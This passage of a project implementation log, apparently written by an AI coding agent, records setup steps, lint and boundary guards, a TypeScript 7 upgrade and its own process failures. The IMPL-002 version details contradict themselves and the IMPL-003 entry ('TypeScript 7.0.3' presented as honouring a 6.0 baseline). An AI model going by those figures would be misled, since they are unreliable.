The heredoc that should have written this entry, the regression entry and the sub-step status **failed with a Python syntax error, and the commit proceeded anyway**. `8a9af9b` therefore shipped without its required documentation, violating [SUB_STEP_PROTOCOL](../02-delivery/SUB_STEP_PROTOCOL.md) §8.

Cause: the commit ran in the same shell invocation as the log-writing script, so a failure in the first half did not stop the second. **Correction:** documentation writes must succeed before `git commit` runs, not alongside it. Logged as `BUG-003`.

### Verification
| Check | Result |
| --- | --- |
| 5/5 services healthy | PASS |
| Extensions functional (157 km geodesic; L2 √27) | PASS |
| Host connectivity on 5700-5707 | PASS |
| No collision with trekyatra / saakshya / real-estate | PASS |
| Port guard meta-test | PASS |
| `pnpm verify` (12 checks) | PASS |

---

## IMPL-003 — STEP-001.03 — Ownership, governance and the TypeScript 7 upgrade

| Field | Value |
| --- | --- |
| Date | 2026-08-05 |
| Requirements | REQ-PLAT-003 |
| Decisions | `ADR-009` (TypeScript 7.0.2), `ADR-010` (ownership) |
| Blast radius | BR-003 (LOW after mitigation) |
| Graph indexed commit | `ef7af7a` — matched HEAD at pre-change |
| Commit | `1a44d71` |

> **Written retrospectively during the STEP-001 closure audit.** The audit found this
> entry missing: `STEP-001.03` was committed with `BR-003` and a regression entry, but
> no implementation-log entry. Recorded as `BUG-005` — including why the
> `substep-docs` guard failed to catch it.

### What was built
`CODEOWNERS` (catch-all + 9 rules), `SECURITY.md`, `CONTRIBUTING.md`; ownership propagated across 56 documents and every step's front-matter; TypeScript upgraded 6.0.3 → 7.0.2; `dependency-cruiser` removed and the boundary check rewritten TypeScript-independently.

### Why this approach
Two owner decisions arrived together. `ADR-010` closed `BLK-001`, the highest-exposure realised risk in the register — until then no step could leave `READY` and no gate could be signed off.

`ADR-009` was the `ASM-004` revalidation case: the blueprint baseline said TypeScript 6.0, but 7.0.2 was `latest`, and portfolio standard §4.18 requires current stable at implementation time. I pinned 6.0.3 first and surfaced 7 for explicit owner choice rather than adopting it silently.

### What surprised us
**TypeScript 7 silently broke module-boundary enforcement.** `dependency-cruiser` 18.1.1 supports `typescript <7`; under the new pin it cruised **0 modules and reported "no dependency violations found"** — a green check verifying nothing. `ADR-003`'s splittability guarantee would have become unenforced without anyone noticing.

Caught only because the boundary guard's meta-test asserts the **rule name**, not merely a non-zero exit. The fix was to rewrite the check TypeScript-independently: import paths are textual, so no compiler upgrade can disable the rule again.

**My pre-change analysis missed this.** I checked the *source* dependency surface (0 files) and called the risk minimal, without checking which *tools* consume TypeScript. Lesson recorded in `BR-003`: for version upgrades, enumerate consuming tools, not just importing source.

### Consequence recorded, not hidden
A single owner **cannot satisfy four-eyes approval** (`REQ-ADMIN-002`, `SC-GOV-02`). That control is now structurally unsatisfiable and must be resolved before `STEP-021` — either a second reviewer or an explicit accepted-risk decision.

### Verification
| Check | Result |
| --- | --- |
| `CODEOWNERS` coverage — all paths owned | PASS |
| TS 7 config valid; `noUncheckedIndexedAccess` still enforced | PASS (exit 0 / exit 1 respectively) |
| Boundary rule fires after rewrite | PASS |
| R5 gap closed — 178 paths owned | PASS |
| `pnpm verify` | PASS |

---

## IMPL-002 — STEP-001.02 — Formatting, linting, strict TypeScript and module boundaries

| Field | Value |
| --- | --- |
| Date | 2026-08-05 |
| Requirements | REQ-PLAT-001 (and enables ADR-003 enforcement) |
| Blast radius | BR-002 (LOW) |
| Graph indexed commit | `11e47a6` — **found stale at `2fe8318`, refreshed per protocol step 3 before proceeding** |
| Commit | *(this commit)* |

### What was built
`.editorconfig`, `biome.json` (Biome 2.5.7), `tsconfig.base.json` (TypeScript 7.0.3, strict + `noUncheckedIndexedAccess` + `exactOptionalPropertyTypes`), `.dependency-cruiser.cjs` module boundary rules, four guards in `tests/guards/`, and a full `pnpm verify` chain covering both JS and Python.

### Why this approach
**Module boundaries are enforced from before the first source file exists.** `ADR-003` chose a modular monolith on the promise it can be split later; that promise is only real if cross-module reach-ins fail the build. Adding the rule after packages exist means retrofitting against violations already written.

The five boundary rules encode architecture decisions directly:
- `no-cross-module-internals` — packages expose entry points, not internals
- `services-not-imported-by-web` — the web app talks to services over generated clients only
- `no-generated-edits` — protects `REQ-PLAT-007`
- `no-circular` — circular imports are the leading indicator of boundary erosion
- `no-orphans` (warn) — surfaces dead modules

### Decisions taken during implementation
| Decision | Alternatives | Rationale | Promoted to ADR? |
| --- | --- | --- | --- |
| **TypeScript 7.0.3, not 7.0.2** | Adopt latest | Blueprint baseline is TS 6.0. Honoring a documented decision is not a new decision; deviating would be. **TS 7 surfaced to the owner for explicit `ASM-004` revalidation rather than silently adopted** | Not yet — pending owner |
| Biome over ESLint+Prettier | ESLint ecosystem | Baseline is silent on linter; Biome is one tool for lint+format, and nothing depends on it yet so it is cheaply replaceable | No |
| dependency-cruiser for boundaries | Biome/ESLint import rules | Only tool that expresses cross-package path rules with the needed precision | No |
| Vacuous-pass guards for empty tree | Omit the scripts until code exists | `tsc` and `mypy` error on an empty tree — a false failure. Guards make the empty case **explicit and self-documenting** rather than silently skipped, and convert to real checks the moment source lands | No |

### Deviations from the step file
Sub-step listed "per-package `tsconfig.json` extending the base" — **deferred**, because zero packages exist. It moves to STEP-002 where the first package is created. Recorded rather than silently dropped.

### What surprised us
1. **The pre-change analysis earned its keep.** It found `BUG-002` (`node_modules` tracked) before any code was written — a defect no existing test covered.
2. **The graph was stale on entry** (`2fe8318` vs `11e47a6`). Protocol step 3 says refresh before continuing; had I skipped it, the analysis would have been against the wrong tree.
3. **Biome rejected its own config twice** — a deprecated `recommended` field and formatting that did not match its own formatter. Fixed via `biome migrate --write` and self-format. A linter that lints its own configuration is a genuinely good property.

### Follow-up created
| Item | Type | ID |
| --- | --- | --- |
| TypeScript 7 vs 7 baseline decision | **Open — owner** | `ASM-004` revalidation |
| Per-package `tsconfig.json` | Deferred | STEP-002 |
| Real lint/typecheck targets | Deferred | STEP-002 |
| `node_modules` artifact guard | Regression test | BUG-002 |

### Verification
| Check | Result |
| --- | --- |
| `pnpm verify` (10-command chain) | **PASS** |
| Boundary rule meta-test | **PASS** — rule `no-cross-module-internals` fired on seeded violation |
| Artifact guard meta-test | **PASS** — exit 1 on seeded `dist/seeded.js` |
| `ruff check` / `ruff format --check` | PASS — 12 files formatted |
| `detect_changes()` | 0 changed symbols, 4 changed files, risk low |

---

## IMPL-001 — STEP-001.01 — Workspace skeleton and pinned toolchain

| Field | Value |
| --- | --- |
| Date | 2026-08-05 |
| Requirements | REQ-PLAT-001, REQ-PLAT-002 |
| Blast radius | BR-001 (LOW) |
| Graph indexed commit | `c37d106` — matched HEAD at pre-change |

### What was built
pnpm workspace (`package.json`, `pnpm-workspace.yaml`) and uv Python workspace
(`pyproject.toml`), version pins (`.nvmrc` 24, `.python-version` 3.14), workspace
directories (`apps/`, `packages/`, `services/`, `tests/`) with boundary READMEs,
and both lock files generated.

### Why this approach
Two toolchain decisions were escalated to the repository owner under `ADR-007`
(propose, then confirm), because the environment did not match the documented plan:

| Decision | Environment finding | Owner choice |
| --- | --- | --- |
| Package manager | pnpm absent, corepack unavailable | **Install pnpm globally** (over npm workspaces) |
| Node runtime | local v25.9.0 vs. Node 24 LTS baseline | **Install Node 24 locally** (over adopting 25) |

Both preserve the blueprint baseline rather than bending it to the machine, which
keeps `ASM-004` honest.

### Decisions taken during implementation
| Decision | Alternatives | Rationale | Promoted to ADR? |
| --- | --- | --- | --- |
| Ruff `DTZ` rule enabled | Default rule set | Flags naive datetimes. This product has three time axes; a naive datetime becomes an infeasible itinerary in STEP-012 | No — captured in `pyproject.toml` comment |
| Placeholder scripts exit 0 with a `[STEP-001.02]` marker | Omit scripts entirely | `pnpm verify` is runnable from day one; markers make the gap visible rather than silent | No |
| pytest markers for `security`/`contract`/`property` | Add later | R7 and R2 need selectable suites from the first test | No |

### Deviations from the step file
None in scope. The step file assumed pnpm and Node 24 were present; both had to be
installed first. Recorded as environment facts, not scope change.

### What surprised us
Two things, both instructive:

1. **`pnpm install` was the first thing in this repository that actually executed
   anything** — and it immediately found `BUG-001`, a defect present in 110 files
   for hours. Markdown had silently absorbed it.
2. **The regression guard reproduced the bug inside itself.** Embedding the literal
   offending pattern truncated the guard's own source file. Fixed by assembling the
   pattern at runtime; the failure mode is now documented in the guard's header so
   nobody "simplifies" it back.

### Follow-up created
| Item | Type | ID |
| --- | --- | --- |
| Stray-markup guard | Regression test | `tests/guards/no-stray-markup.sh` |
| Lock-file drift CI enforcement | Deferred | STEP-001.03 |
| Node 24 PATH is not persistent (keg-only brew install) | Documentation | STEP-001.05 README |

### Verification
| Check | Result |
| --- | --- |
| `pnpm install` under Node 24.19.0 | PASS — `pnpm-lock.yaml` created |
| `uv sync` | PASS — Python 3.14.2 resolved, `uv.lock` created |
| `pnpm verify` | PASS |
| Regression R1–R7 | See REGRESSION_LOG |

---

## What must be logged

| Event | Log here | Also log |
| --- | --- | --- |
| Sub-step implemented | ✅ | Regression log, tracker |
| Bug found during implementation | Reference it | [BUG_REGISTER](BUG_REGISTER.md) |
| Bug fixed | Reference it | [BUG_REGISTER](BUG_REGISTER.md) + regression test |
| Enhancement beyond requirement | Reference it | [ENHANCEMENT_LOG](ENHANCEMENT_LOG.md) |
| Architectural decision taken mid-work | ✅ + promote | [DECISION_LOG](../02-delivery/DECISION_LOG.md) as an ADR |
| Assumption invalidated | ✅ | [ASSUMPTION_REGISTER](../02-delivery/ASSUMPTION_REGISTER.md) |
| Approach abandoned | ✅ **with the reason** | Sub-step marked `DROPPED` |
| Dependency or version change | ✅ | Blast-radius record |

**Negative results are recorded, not discarded** (portfolio standard §7.38). An approach that failed and why is more valuable to the next engineer than a clean history that hides it.
